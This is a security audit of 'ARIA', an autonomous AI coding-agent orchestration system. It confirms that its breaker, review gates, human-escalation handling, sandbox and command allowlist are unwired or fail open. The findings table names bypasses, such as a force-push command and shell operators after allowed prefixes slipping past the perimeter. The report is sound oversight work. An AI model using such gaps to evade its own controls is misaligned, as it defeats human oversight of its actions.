# ARIA Codex Audit — Independent Source Verification (2026-07-26)

Cycle: `2026-07-26-aria-codex-audit-verification`
Verified commit: `bdaf00bf633151927740304985551a012e5e2e5c` (same commit the Codex report audited)
Scope: `aria-kernel/aria_kernel/**`, `tools/aria-poc/**`, `.github/workflows/aria-*.yml`, `.gitignore`,
plus live-remote branch/tag triage for the report's §19.

Method: every claim was re-derived from source at the audited commit. Where a claim was
falsifiable by execution, it was **executed** rather than reasoned about (breaker state machine,
Jaccard/revision independence layers, `poll_pr_checks` empty-set behaviour, the
`feat/aria-autonomous-mode` summary parser). Claims about the live GitHub Actions artifact were
**not** re-fetched; instead the code paths that _produce_ each reported number were verified, which
independently explains every figure the report cited.

## Verdict

The Codex report is substantially accurate. **All 15 P0 findings are confirmed.** Eight are more
severe than described. Three framings are too harsh and are corrected below. Four findings are new.

The report's central thesis — _code exists, is not connected to a production call chain, and is
reported as green_ — is verified in its strongest possible form:

| Structural fact                                                                                | Evidence                                                                                                |
| ---------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------- |
| 4 policy functions with **zero** production callers                                            | `assert_within_budget`, `record_actual_usage`, `reserve_cycle_budget`, `circuit_breaker.record_failure` |
| 1 function the orchestrator calls that **does not exist**                                      | `replay_pending_bridges`                                                                                |
| 2 of 3 independence layers that **cannot fire**, proven by execution                           | `independence_check` layers 2 + 3                                                                       |
| 4 summary counters structurally pinned to zero                                                 | `incomplete_lifecycle_count`, `warning_count`, `suppressed_count`, `truncated_count`                    |
| the agent queue directory is gitignored **out of its own consumer's filesystem**               | `.gitignore:205` vs `aria-agent-executor.yml`                                                           |
| the canonical schema validator has zero callers **and** would reject every production envelope | `validate_request` vs `must_satisfy[].statement`                                                        |

Autonomous write/merge must stay closed. That conclusion is unchanged.

## Registered finding IDs

This document is the SSoT for the finding IDs below; the hash-chained registry entries carry their
state. IDs were allocated by `npm run findings:add` (which mints the sequence itself, so the audit
report's `P0-*` / `NEW-*` labels are the analysis names and these are the tracked names).

| Registry ID           | Audit label                | Severity | Finding                                                                                                                                                        |
| --------------------- | -------------------------- | -------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `ORPHAN-CRITICAL-418` | NEW-01                     | CRITICAL | corrupting the failure ledger un-trips the breaker                                                                                                             |
| `ORPHAN-CRITICAL-419` | P0-02                      | CRITICAL | producer and executor share no queue                                                                                                                           |
| `ORPHAN-CRITICAL-420` | P0-07                      | CRITICAL | budget + breaker have zero production callers                                                                                                                  |
| `ORPHAN-HIGH-421`     | P0-10 / NEW-02             | HIGH     | all three independence layers non-functional                                                                                                                   |
| `ORPHAN-HIGH-422`     | P0-15                      | HIGH     | HUMAN_REQUIRED becomes `no_gaps`                                                                                                                               |
| `ORPHAN-HIGH-423`     | P0-09                      | HIGH     | specialist gate fails open in `standard` and `autonomous`                                                                                                      |
| `ORPHAN-HIGH-424`     | P0-01                      | HIGH     | summary counters pinned to zero; invalid state published                                                                                                       |
| `ORPHAN-HIGH-425`     | P0-14                      | HIGH     | installation token full-scope; TTL is fiction                                                                                                                  |
| `ORPHAN-HIGH-426`     | P1-03 + operator direction | HIGH     | HUMAN_REQUIRED waits on a human indefinitely, and the sweep that makes it visible has CLI-only callers                                                         |
| `ORPHAN-CRITICAL-427` | hunt                       | CRITICAL | The bash sandbox perimeter has no kernel caller                                                                                                                |
| `ORPHAN-CRITICAL-428` | hunt                       | CRITICAL | HARD_FAIL_CHECKS is a pure-data registry with no callable field and zero production i…                                                                         |
| `ORPHAN-HIGH-429`     | hunt                       | HIGH     | Gate B oscillation guard has no caller while the streak it reads only ever increments                                                                          |
| `ORPHAN-HIGH-430`     | hunt                       | HIGH     | ARIA-Watchdog goes permanently silent after its first poll because the daemon's own g…                                                                         |
| `ORPHAN-HIGH-431`     | hunt                       | HIGH     | The banned-phrase HARD-reject check scans envelope keys the production submission nev…                                                                         |
| `ORPHAN-MEDIUM-432`   | hunt                       | MEDIUM   | Architecture Spine Gate drops unreadable or undecodable files from the invariant viol…                                                                         |
| `ORPHAN-HIGH-433`     | hunt                       | HIGH     | The aria-tools publication integrity gate verifies only a small fraction of the decla…                                                                         |
| `ORPHAN-HIGH-434`     | hunt                       | HIGH     | The daily report PR can never be staged                                                                                                                        |
| `ORPHAN-HIGH-435`     | this session               | HIGH     | The kernel test suite inherits the agent container's global git config                                                                                         |
| `ORPHAN-MEDIUM-436`   | this session               | MEDIUM   | The test_gate_canonical_suite policy named mutation and coverage gates that do not ex…                                                                         |
| `ORPHAN-HIGH-437`     | this session               | HIGH     | The hard-fail perimeter is one undifferentiated gate                                                                                                           |
| `ORPHAN-HIGH-438`     | this session               | HIGH     | Five declared pre-PR-open hard-fail checks have no implementation                                                                                              |
| `ORPHAN-HIGH-417`     | this session               | HIGH     | the ID allocator and the trailer resolver each read only half the ORPHAN identifier space                                                                      |
| `ORPHAN-CRITICAL-439` | this session               | CRITICAL | no sandbox backend is installed anywhere, so write containment refuses every spawn                                                                             |
| `ORPHAN-CRITICAL-440` | this session               | CRITICAL | the observe burn-in rejects the runtime writes it exists to produce                                                                                            |
| `ORPHAN-HIGH-441`     | this session               | HIGH     | the commit-msg traceability hook binds for nobody — `prepare` never runs under `--ignore-scripts`                                                              |
| `SUPPLY-HIGH-001`     | this session               | HIGH     | four high advisories block a required check; the suggested fix breaks the build                                                                                |
| `ORPHAN-MEDIUM-442`   | self-audit of this branch  | MEDIUM   | a `# type: ignore` was added on the Gate C verdict — the value that decides whether the specialist gate blocks                                                 |
| `ORPHAN-HIGH-443`     | self-audit of this branch  | HIGH     | the Gate C block policy is a denylist, so an unrecognised verdict passes as a clean review                                                                     |
| `ORPHAN-MEDIUM-444`   | self-audit of this branch  | MEDIUM   | the debt-plan repin script wrote all three mirror files before refusing, contradicting its own docstring                                                       |
| `ORPHAN-MEDIUM-445`   | self-audit of this branch  | MEDIUM   | the ARIA authority hash had a checker and no writer, so refreshing it meant copying a value out of a Jest failure                                              |
| `ORPHAN-CRITICAL-446` | adversarial re-audit       | CRITICAL | the independence gate never receives the cross-reviewer's text, so the diversity layer computes neither comparison and every `converged` verdict is downgraded |
| `ORPHAN-HIGH-447`     | adversarial re-audit       | HIGH     | the two tests pinning the specialist gate can silently skip themselves instead of failing                                                                      |
| `ORPHAN-MEDIUM-448`   | adversarial re-audit       | MEDIUM   | the repin script silently no-ops on anchor drift and exits 0, and was the one gate script nothing type-checked                                                 |
| `ORPHAN-MEDIUM-449`   | caught by CI               | MEDIUM   | the authority-hash writer read the git index, so running it before staging wrote a value the commit could not match                                            |
| `ORPHAN-HIGH-450`     | adversarial re-audit       | HIGH     | the HUMAN_REQUIRED adjudication panel that closed `426` had zero production callers                                                                            |
| `ORPHAN-CRITICAL-451` | 13-agent audit             | CRITICAL | the firejail sandbox backend applied none of the READONLY_PATHS while satisfying the S0 containment exit criterion                                             |
| `ORPHAN-MEDIUM-452`   | 13-agent audit             | MEDIUM   | the bwrap probe did not mirror the wrapper, so it could report available on a host where every spawn dies                                                      |
| `ORPHAN-HIGH-453`     | 13-agent audit             | HIGH     | a doubled slash walked a kernel path past the self-modification check                                                                                          |
| `ORPHAN-HIGH-454`     | 13-agent audit             | HIGH     | `git push origin aria-impl-<sha> -f` passed the whole bash perimeter                                                                                           |
| `ORPHAN-HIGH-455`     | 13-agent audit             | HIGH     | three headline fixes had no callsite coverage, and the test claiming otherwise was a tautology                                                                 |
| `ORPHAN-HIGH-456`     | 13-agent audit             | HIGH     | the bounded cycle summary deletes the two keys the publisher reads                                                                                             |
| `ORPHAN-HIGH-457`     | claim re-verification      | HIGH     | the explicit-append path was blind to the markdown store AND compared full id strings — the retrace's own collision, still reachable                           |
| `ORPHAN-MEDIUM-458`   | claim re-verification      | MEDIUM   | a YAML comment satisfied the sandbox-contract invariant, so the real verification step could be deleted unnoticed                                              |
| `ORPHAN-MEDIUM-459`   | claim re-verification      | MEDIUM   | `apply_resource_limits` had zero production callers; a write-capable agent spawn was bounded by nothing                                                        |
| `ORPHAN-CRITICAL-460` | fresh coverage lens        | CRITICAL | a shell operator after an allowed prefix bypassed the allowlist, the denylist and the force-push check at once                                                 |
| `ORPHAN-CRITICAL-461` | fresh coverage lens        | CRITICAL | broader-scope claims, globs, empty surface lists, an echoed test suite, and every gh-api route that writes `main` all passed                                   |
| `ORPHAN-HIGH-462`     | fresh coverage lens        | HIGH     | a specialist submitting garbage was recorded as a clean review, so hardening two sides of the gate made garbage better than silence                            |
| `ORPHAN-MEDIUM-463`   | observed in CI             | MEDIUM   | `deploy-ssot-contract`'s hostile-filename test is flaky under parallel workers, in a required check                                                            |
| `ORPHAN-MEDIUM-464`   | operator decision          | MEDIUM   | one pushed commit's missing trailer required an allowlist exception the author would not grant himself                                                         |

Every ID above is listed here on purpose: this document is the `Closes:` target for all of them, and
a trailer pointing at a file that does not name the finding is traceability theatre. Remaining
confirmed P0/P1 findings (P0-03, P0-04, P0-05, P0-06, P0-08, P0-11, P0-12, P0-13, NEW-03, NEW-04 and
the P1 set) are registered in the wave that closes them, so an OPEN finding always has a current
owner rather than a placeholder.

**On the numbering.** These IDs run from 417, not 333. The first allocation was made by an ID
allocator that could not see `docs/reviews/orphan-findings.md` and therefore believed sequences
333-351 were free; the markdown store was already at 416, so all nineteen landed on live findings and
eight resolved to the wrong one. §9 has the mechanism. The branch that carried the first numbering was
retraced onto uncollided IDs rather than patched, because a trailer already pushed cannot be amended
and force-push is forbidden here.

---

## 1. P0 verification table

| ID                                                | Status    | Severity vs report                                |
| ------------------------------------------------- | --------- | ------------------------------------------------- |
| P0-01 invalid state published as `ok`             | CONFIRMED | **worse** — 4 pinned counters, not 2              |
| P0-02 producer/executor share no queue            | CONFIRMED | **worse** — structural certainty, not observation |
| P0-03 scheduled path never reaches code/PR        | CONFIRMED | as described                                      |
| P0-04 "read-only" roles are unrestricted Claude   | CONFIRMED | **worse** — unconditional, all roles              |
| P0-05 profile downgrade does not revoke authority | CONFIRMED | as described                                      |
| P0-06 cross-host lease/CAS is a local file        | CONFIRMED | **worse** — no compare at all                     |
| P0-07 budget + breaker are decoration             | CONFIRMED | **worse** — literally zero callers                |
| P0-08 role/request schema is not single-source    | CONFIRMED | **worse** — mismatch is bidirectional             |
| P0-09 specialist gate cannot complete, fails open | CONFIRMED | **worse** — autonomous is fail-open too           |
| P0-10 "three independent agents" proves nothing   | CONFIRMED | **worse** — 2 layers provably inert               |
| P0-11 dual lanes + global PR scan                 | CONFIRMED | see Correction 2                                  |
| P0-12 intake/approval identity untrustworthy      | CONFIRMED | as described                                      |
| P0-13 required check is not merge authority       | CONFIRMED | see Correction 1                                  |
| P0-14 credential/signer isolation absent          | CONFIRMED | **worse** — `repositories` key absent entirely    |
| P0-15 review can report `no_gaps` unverified      | CONFIRMED | **worse** — HUMAN_REQUIRED becomes approval       |

### P0-01 — four counters, not two

`cycle.py:646` pins `"incomplete_lifecycle_count": 0` in the per-cycle state dict.
`runtime_artifacts.py:756` then _sums that field across cycles_ — so the aggregate is structurally
zero no matter what happened. `runtime_artifacts.py:802` pins `"warning_count": 0`. Additionally
`runtime_artifacts.py:750-751` declare `suppressed_count = 0` and `truncated_count = 0` as locals
that are **never incremented** before being emitted at lines 803-804. Four fields, all reported to
the operator, all incapable of being non-zero.

Publication side: `aria-auto-cycle.yml` uploads under the canonical name `aria-tools-state` with
`if: always()`, `overwrite: true`, `if-no-files-found: error`. A cycle killed mid-write publishes
its partial tree as the canonical snapshot, and the next run restores it.

### P0-02 — structural, not observational

`.gitignore:205` ignores `aria-tools/agent-invocations/`. `aria-agent-executor.yml` checks out
`ref: main` with `persist-credentials: false` and has **no artifact-restore step**. Therefore the
queue directory _cannot exist_ in the executor's filesystem, and
`aria-kernel agent next-pending --tools-dir aria-tools` returns empty on every run by construction.
The report inferred this from one live run; it is a guarantee of the code. The response envelope is
uploaded as `aria-response-<request_id>` and is never read back by the producer.

### P0-03 — the production default is a refusal

`autonomy_orchestrator.py:460-462` sets `v9_implementation_runner = NoOpV9ImplementationRunner()`
when no runner is injected — which is the case on the scheduled path.
`cycle_phases/implementer.py:125-130` returns
`terminal_state="IMPLEMENTATION_REQUEST_REFUSED", rejection_class="no_op_v9_runner"`.
`aria_kernel/task.py` exists and has **zero non-test importers**.

### P0-04 — unconditional, every role

`agent_runtime_profile.py:102-105` parses only `model` and `effort` from agent frontmatter;
`AgentRuntimeProfile` (line 59-61) has no tool/permission field at all. The declared
`tools: Read, Grep, Glob` lines in `.claude/agents/*.md` are never consumed as policy.

`ci_executor.py:958-963` invokes:

```python
return run_claude_exec(
    prompt_text=prompt_text,
    timeout_seconds=timeout_seconds,
    model=model,
    effort=effort,
)
```

No `skip_permissions`, no `permission_mode`, no `cwd`. `claude_runtime.py:205` defaults
`skip_permissions: bool = True`, so line 245 appends `--dangerously-skip-permissions` — for
adversarial judges, cross-reviewers and planners identically. `ci_executor.py:929-944` _audits_ the
inherited `CLAUDE_*`/`ANTHROPIC_*`/`HOME`/`USER` environment into a governance event but never
strips it.

### P0-06 — the compare is missing, not just remote-invisible

The module docstring (lines 32-34) states plainly: _"The lease is NOT a mutex (no kernel-side
locking primitive). It is a TRUSTED-WITNESS contract."_

`acquire_remote_cas_lease` (lines 256-315) is `_read_remote_cas_lease` → decide →
`_atomic_write_remote_cas_lease`. The **write** is atomic (`tmp.replace(path)`); the **compare** does
not exist. Two hosts that both observe an absent-or-stale lease both compute `epoch = N+1` (line
`_build_remote_cas_lease`) and both write; the last writer wins with no detection. The docstring's
claim that "the compare fields are `epoch`, `owner`, `target_ref`, `head_sha`, `expires_at`"
describes a check that is performed only against the value the same process just read. And
`.gitignore:240` ignores `aria-tools/locks/`, so the "remote-visible" lease is invisible to every
other host.

### P0-07 — zero callers, verified

```
assert_within_budget    → cost_budget.py:122 (def), :267 (__all__)
record_actual_usage     → cost_budget.py:172 (def), :269 (__all__)
reserve_cycle_budget    → budget.py:282 (def) + log strings
record_failure          → circuit_breaker.py:168 (def), :312 (__all__)
```

The only other hits are prose: `genesis_policy.py:15` is a comment describing an intent, and
`ci_executor.py:698` is a comment saying enforcement happens "separately". There is no separate
enforcement. Every budget cap and every breaker threshold in the documentation is unreachable.

### P0-08 — the mismatch runs both ways

`agent_contract.py:83` defines `REQUEST_SCHEMA = "aria/agent-request/v1"` and `validate_request` at
line 139 — with **zero callers anywhere**, test or production. Production mints
`"$schema": "aria/agent-invocation-request/v1"` (`agent_invocations.py:480`).

The second half matters for sequencing: `agent_contract.py:126-135` requires
`must_satisfy[].statement`, while production minters emit `description` (e.g.
`specialist_review_runner.py:406-412`, `review_runner.py` must_satisfy construction). Wiring
`validate_request` in without also fixing the minters would reject every real envelope. **These two
must land in the same change.**

### P0-09 — and `autonomous` is fail-open, which is the dangerous half

`run_specialist_review_runner` (lines 340-462) never opens `results.jsonl`. Its poll loop's only
effect is delay; the tail return (lines 452-462) is unconditional:

```python
consolidated_verdict="specialists_unavailable",
findings_by_specialist={},
specialists_timed_out=selected,
```

Every selected specialist is recorded as timed-out even if it submitted a perfect signed result.
Selection scope is `allowed_scope=[f"cycle/{cycle_id}"]` and `evidence_refs=[f"cycle:{cycle_id}"]`
(lines 415-416) — no diff, no CODEOWNERS, no service map.

The gate consequence is at `autonomy_orchestrator.py:1509-1514`:

```python
_blocks_cycle = specialist_verdict in {
    "consolidated_remediation_required",
    "consolidated_judge_split",
} or (_is_strict and specialist_verdict == "specialists_unavailable")
```

Since the runner can only ever return `specialists_unavailable`, the specialist gate blocks **only in
`strict`**. The orchestrator's own comment at line 1459 confirms `autonomous → fail-open (degraded
acceptable)`. The profile that holds real merge authority has the weakest specialist gate in the
system. That inversion is the finding.

### P0-10 — two of three layers are provably inert

`convergence_drainer.py:1211-1224` calls `verify_independence` with:

- `primary_revision_id=f"{plan_id}-r1"`, `challenger_revision_id=f"{plan_id}-c1"`,
  `cross_review_revision_id=None` — synthesized constants, never real revision ids;
- `primary_text="(primary plan text — not loaded at convergence; ...)"`,
  `challenger_text="(challenger plan text)"`, `cross_review_text="(cross_review text)"` — literal
  placeholders, never agent output.

Executed against the real implementation:

```
jaccard primary~cross    : 0.0
jaccard challenger~cross : 0.25
jaccard primary~chall    : 0.0
any layer-3 violation possible (ceiling 0.85)? : False
verify_revision_id_distinctness('PLAN-r1','PLAN-c1',None) : (True, [])
```

Layer 3 (diversity) and layer 2 (revision distinctness) **can never fire**. Only layer 1 (claim
disjointness) is live, and it receives `request_ids[0]`, `[1]`, `[2]` positionally from a list that
accumulates across rounds, so on round 2+ the indices no longer correspond to
primary/challenger/cross-review. The whole block is additionally skipped unless
`len(request_ids) >= 3`.

### P0-11 — global candidate set, real merge

`auto_merge_runners.py:149` takes `candidate_prs = self.pr_enumerator(adapter)`, wired to
`enumerate_prs_with_readiness_claims` (lines 235-250), which reads the **global**
`enterprise/readiness-claims.jsonl` and collects every `pr_number` it finds. Line 153 sets
`dry_run = self.profile != "autonomous"`; under `autonomous` each globally-enumerated PR goes to
`merge_pr_if_ready`. Cycle X's verdict can therefore be spent on PR Y.

### P0-12 — a single character is a valid approval

`runtime_profile.py:328`: `if not (operator_approval_ref or "").strip():`. That is the entire
validation. `"x"` transitions the kernel to `autonomous`. No signature, TTL, nonce, actor binding,
or replay protection.

### P0-14 — the `repositories` scope key does not exist

`gh_token_factory.py:304` documents `repositories=[<repo>]`. The actual request body (lines 411-415)
is:

```python
data=_json.dumps({
    "permissions": {
        "pull_requests": "write",
        "contents": "write",
    },
}).encode("utf-8"),
```

There is **no `repositories` key**. The minted installation token therefore carries the full
installation scope — every repository the App can reach — not one repo. Separately,
`ttl_seconds` is spent as an HTTP socket timeout (`urlopen(req, timeout=ttl_seconds)`, line 415);
the API response's `expires_at` is never read, and `InstallationTokenLease.ttl_seconds` records the
requested 300 as if it were the token's lifetime. The documented "5-minute, single-repo" token is
neither. The token is written to `aria-debts/keys/<cycle_id>.token` inside the workspace, and Mode B
copies the operator PAT there verbatim.

### P0-15 — HUMAN_REQUIRED is converted into approval

`agent_invocations.py:1153-1170`: `next_pending_request` returns non-`None` **only** for derived
state `PENDING` or `REQUEUED`; its docstring states HUMAN_REQUIRED, CANCELLED and terminal states
are skipped.

`review_runner.py:251-257` treats that `None` as success:

```python
pending = next_pending_request(role=_ADVERSARIAL_ROLE, base_dir=base_dir)
if pending is None:
    # ... we cannot distinguish without reading results.jsonl;
    # for V5.2 minimum, treat absence as "submitted".
    submission_observed = True
    break
```

and lines 281-291 then return `verdict="no_gaps"`. So a request that was claimed-and-abandoned,
rejected, or **escalated to HUMAN_REQUIRED** produces the same verdict as a clean pass. The one
signal that means "a human must look at this" is the signal that clears the gate.

---

## 2. P1 verification

| ID                                           | Status                       | Note                                                                                                                                   |
| -------------------------------------------- | ---------------------------- | -------------------------------------------------------------------------------------------------------------------------------------- |
| P1-01 manifest covers half the surfaces      | CONFIRMED                    | 129 raw `append_jsonl(` sites outside `ledger.py` vs 116 `append_declared_jsonl(`                                                      |
| P1-02 restore source unverified              | CONFIRMED                    | takes `live[0]`; no run-conclusion/branch/commit/producer check; missing artifact → silent fresh bootstrap; only `aria-tools/` carried |
| P1-03 HUMAN_REQUIRED lost between views      | CONFIRMED                    | `sweep_lease_lifecycle_for_human_required` has CLI-only callers (`cli.py:3457,3482`)                                                   |
| P1-04 cycle lifecycle not crash-safe         | CONFIRMED                    | no outer `try/finally` terminal guarantee around the phase chain                                                                       |
| P1-05 claim/worker heartbeat gaps            | CONFIRMED                    | `heartbeat` + reaper reachable only from CLI                                                                                           |
| P1-06 bridge "replay" does not exist         | CONFIRMED (root cause found) | see below                                                                                                                              |
| P1-07 memory counts repetition as confidence | CONFIRMED                    | `memory.py:589` unconditional `support_count + 1`; `:598` `+ min(0.05, support_count*0.005)`; no `evidence_hash` dedup                 |
| P1-13 ProfileGate injected, never called     | CONFIRMED                    | `grep "profile_gate\."` → **zero hits**; defaulted to `NoOpProfileGate()` at `autonomy_orchestrator.py:469-471`                        |
| P1-15 daily report runs on empty state       | CONFIRMED                    | `aria-daily-report.yml` has no state-restore step                                                                                      |

**P1-06 root cause.** `replay_pending_bridges` **does not exist anywhere in the repository.**
`_default_bridge_drainer` (`autonomy_orchestrator.py:159-167`) does
`getattr(bridge_status_ledger, "replay_pending_bridges", None)` and, finding `None`, returns
`{"status": "skipped", "reason": "replay_pending_bridges_unavailable", "iterations": 0}`. This is a
deterministic, every-cycle outcome and it exactly explains the live artifact's 21/21
`bridge = skipped`. The report treated the live figure as an observation; it is a guarantee.

---

## 3. New findings (not in the Codex report)

### NEW-01 (CRITICAL) — corrupting the breaker ledger silently un-trips the breaker

Executed against the real implementation with `threshold_24h = 3`:

```
3 valid failure rows                    → tripped     (correct)
corrupt 2 of the 3 rows                 → ok          (breaker un-trips)
3 rows with unparseable `ts`            → ok          (breaker un-trips)
```

Two independent row-dropping paths cause this:
`_read_failures` (`circuit_breaker.py:114-136`) reads with `on_corruption="tolerant"`, and
`_count_failures_24h` (`:140-152`) silently `continue`s on an unparseable `ts`. The trip decision is
`sliding >= threshold` (`:165`), so **any** damage to the ledger moves the breaker toward permissive.
A crash mid-append, a truncated artifact round-trip, or deliberate tampering all reset the safety
net to `ok`.

Combined with `auto_action_gate._load_breaker_state` returning `"ok"` on any exception
(`auto_action_gate.py:206-218`, comment: _"fail-closed-but-permissive"_), **every** failure mode of
the breaker subsystem resolves to "allow".

The module's in-code rationale inverts the correct direction: it argues that _"failing closed on a
single bad row should NOT block the breaker's current-state read"_. For a safety net the opposite
holds — unreadable failure evidence must read as `tripped`, never as `ok`. This is a Tier-1 fixable
defect (make the state derivation refuse to answer `ok` on a corrupt or unreadable ledger).

### NEW-02 (HIGH) — the independence check needs a decision, not a repair

Split out from P0-10 because the remediation differs. P0-10's fix is correct request-ID plumbing;
NEW-02 is that layers 2 and 3 are _decoration with a security-sounding name_. Either real revision
ids and real agent output get plumbed in, or both layers should be deleted and the contract restated
honestly as "independence rests on claim disjointness alone". Leaving a provably-inert check named
`verify_independence` in the merge-gating path is worse than having no check, because it reads as
coverage in every review.

### NEW-03 (MEDIUM, latent) — `poll_pr_checks` reports a check-less PR as fully green

Executed with `gh` on PATH returning `[]`:

```
poll_pr_checks(pr_number=1, max_attempts=1, ...) → ('all_success', ())
```

Cause: `auto_merge_runners.py:544`, `all(b == "pass" for b in buckets)` where `buckets` is empty —
`all([])` is `True`. A PR with zero checks, or a `gh` call that returns an empty array for any
reason, reads as "every required check completed with SUCCESS".

Currently **latent**: the function has no caller (only the `__all__` entry at line 323), and its
former consumer `evaluate_v9_implementation_merge` is demoted to always-refuse. It must be fixed
_before_ any rewiring — require a non-empty result set intersected against an explicit
required-context list.

### NEW-04 (MEDIUM) — the report's §19.2 parser claim, empirically confirmed

On `feat/aria-autonomous-mode`, the bridge-replay loop parses the CLI summary with
`start = text.rfind("{")`. Executed against a realistic `autonomy_output_summary` payload, the
fragment after the last `{` is:

```
'{"path": "a", "sha256": "b"}], "failed_phases": []}'   → JSONDecodeError → "unparsed"
```

The shell then evaluates `[ "$EXIT_REASON" != "bridge_replay_required" ]` as true and breaks on
pass 1. The advertised 6-pass loop is inert. The branch's seven new tests assert only that
`MAX_PASSES=6` appears in the YAML, never exercising the parser. This confirms the report's
recommendation not to merge that branch as-is.

---

## 4. Corrections — three places where the report is too harsh

These matter because they change what should be built versus rewritten.

### Correction 1 — `merge_pr_if_ready` **is** head-SHA-bound

P0-13's conclusion holds: the required CI check `aria-merge-authority` is a contract-test suite, not
an authority decision (its only assertion step runs `npm run aria:compile`, three unittest modules,
`gates:required-status-checks`, `aria:docs:ssot`, and never reads a PR number or head SHA).

But "no head-bound live gate exists" is wrong. `merge_authority.py` does exactly this:

- `:55-57` requires `head_sha`, raising `merge_authority_head_sha_required` when absent;
- `:142-160` re-fetches the PR and re-evaluates immediately before merging;
- `:178-189` blocks with reason `"PR head SHA changed after green evaluation"`;
- `:191-197` passes `expected_head_sha` and arms `authority_token = f"merge-authority:{pr}:{head_sha}"`.

This is the right foundation. P0-13's fix is to **promote this existing kernel gate into the required
check**, not to design a head-binding mechanism from scratch.

### Correction 2 — the V9 merge path is already disabled, not merely orphaned

`evaluate_v9_implementation_merge` (`auto_merge_runners.py:564-591`) unconditionally returns
`eligible=False` with `rejection_class="v9_merge_path_disabled_use_merge_if_green"`. Its docstring
states it "must never call `gh pr merge`". So `auto_merge.merge_if_green` / `merge_pr_if_ready`
genuinely is the single merge executor. The report's §19.2 implication that enabling `autonomous`
re-opens a second merge executor is inaccurate. P0-11's real risk is the **candidate set** being
global, not two competing executors — which narrows the fix considerably.

### Correction 3 — `AutoActionGate` is fail-closed on a _tripped_ breaker

`auto_action_gate.py:103-104` forces `human_ack_required = True` whenever `breaker_state != "ok"`,
and `AUTONOMOUS_AUTO_ACK_LANES` is empty so it returns `True` on every path today. The fail-open is
narrower than the report states: it is specifically the _unreadable-state_ path, which NEW-01 now
covers with a concrete reproduction. Worth recording precisely, because the report's phrasing
suggests the tripped-breaker path itself is permissive, and it is not.

---

## 5. Live-branch and archive triage (report §19)

Re-verified against live remote heads:

| Claim                                                               | Result                                                                                                                                                                                                                                     |
| ------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| 58 remote branches                                                  | 59 now (one added since the report)                                                                                                                                                                                                        |
| `feat/aria-autonomous-mode` — 1 commit ahead, touches ARIA workflow | CONFIRMED (`aria-auto-cycle.yml` +130, `.gitignore` +4, `workflow_contract_registry.py` +7, 1 new test +88, docs)                                                                                                                          |
| `fix/production-host-control-plane` — 3 ahead, no ARIA paths        | CONFIRMED. The report's own "23 aria matches" would be a false positive: those paths match the substring inside _inv**aria**nt_ (`tests/invariants/**`, `backup-manifest-invariant.yml`). No ARIA kernel or ARIA workflow file is touched. |
| `dependabot/.../setup-node-7.0.0` — 1 ahead, no functional ARIA fix | CONFIRMED                                                                                                                                                                                                                                  |
| Registry at ~1,033 entries on current `main`                        | CONFIRMED (`docs/reviews/_registry/findings.jsonl` = 1033 lines)                                                                                                                                                                           |
| No P0 is closed on any other branch                                 | CONFIRMED                                                                                                                                                                                                                                  |

Conclusion unchanged: do not merge `feat/aria-autonomous-mode`; do not merge archive tags; build
forward from current `main`.

---

## 6. Implementation ordering

The report's Wave 0-5 structure is sound. One resequencing inside Wave 0, ordered by
safety-delta-per-diff-size — NEW-01 moves to the front because it is the smallest change with the
largest correctness gain, and because every other fail-closed fix is worth less while the breaker
itself reads `ok` under damage.

**Wave 0 — truth and fail-closed**

1. **NEW-01** — breaker state derivation refuses `ok` on a corrupt/unreadable ledger;
   `_load_breaker_state` stops swallowing exceptions into `"ok"`.
2. **P0-01** — derive `incomplete_lifecycle_count` / `warning_count` / `suppressed_count` /
   `truncated_count` from the ledgers; add an end-of-run fail-closed `integrity verify --full`;
   publish invalid state under a `quarantine-evidence` name, never as `aria-tools-state`.
3. **P0-15 + P0-09** — require a typed accepted result bound to request id + head SHA before
   `no_gaps`; make `specialists_unavailable` block in `standard` **and** `autonomous`, not only
   `strict`.
4. **P0-10 / NEW-02** — plumb real revision ids and real agent text, or delete layers 2-3 and
   restate the contract.
5. **P0-13** — rename the current required check to `aria-contract-tests`; keep autonomous merge
   closed until the real authority check exists (built on `merge_pr_if_ready`, per Correction 1).
6. **P1-03** — run the HUMAN_REQUIRED parity reconciliation on every cycle boot, and make a
   discrepancy turn the dashboard red.

**Wave 1 — durable state, queue, crash recovery**
P0-02 (single job graph, or a shared durable queue — artifacts become evidence only),
P1-02 (signed snapshot manifest + verified-successful-`main` restore), P0-06 (real CAS + monotonic
fencing, honoured at every mutator), P1-06 (implement `replay_pending_bridges` or delete the
drainer's dependency on it), P1-04 (cycle WAL + boot-time resume), P1-01 (all writers through the
declared registry).

**Wave 2 — one identity model**
P0-08 (single generated RoleSpec + AgentRequest/Response; minters and validator in one change),
P0-04 (OS-level sandbox; `skip_permissions=False` for read-only roles; clean allowlisted env),
P0-14 (capability broker, real `repositories` scope, expiry read from the API response),
P0-05 (profile epoch + capability revocation on downgrade).

**Wave 3 — delivery**
P0-03 (single canonical lane), P0-11 (exact WorkItem→PR→head binding; global scan loses merge
authority), P0-12 (authenticated intake, signed single-use approval), NEW-03 before any
`poll_pr_checks` rewiring.

**Waves 4-5** — deploy provenance, canary, real rollback, incident/auto-heal, provenance memory:
as the report describes.

---

## 7. Test-suite corroboration

The report's test figures were reproduced:

```
Ran 2680 tests in 272.204s
OK (skipped=39)
```

The test **count matches exactly** (2680). Skips differ (39 here vs 35 reported) because this run is
on Python 3.11 against CI's 3.12; the delta is environment-gated skips, not regressions. The
`ResourceWarning: unclosed file` messages the report noted are also reproduced.

This is the sharpest available illustration of the report's thesis: 2,680 green tests coexist with
four zero-caller policy functions, a non-existent function the orchestrator calls, and two
independence layers that cannot fire. The suite is large and it passes; it does not test whether the
pieces are wired to each other.

## 8. Second-round defect hunt (independent, adversarially verified)

A six-lens hunt was run over the kernel, executors and workflows looking for the _shape_ of NEW-01
— declared authority with no caller, and damaged evidence reading as success. Each finding was
handed to an adversarial verifier instructed to refute it by default and to reproduce it or drop it.
**Six were confirmed, none refuted.** Two further workflow findings were reproduced independently
here. All are registered.

| ID                    | Severity | Finding                                                                                                                                                                                                  |
| --------------------- | -------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `ORPHAN-CRITICAL-427` | CRITICAL | the bash sandbox perimeter has no kernel caller — `wrap_bash_in_sandbox` returns argv unchanged, so containment is prose addressed to the process being contained                                        |
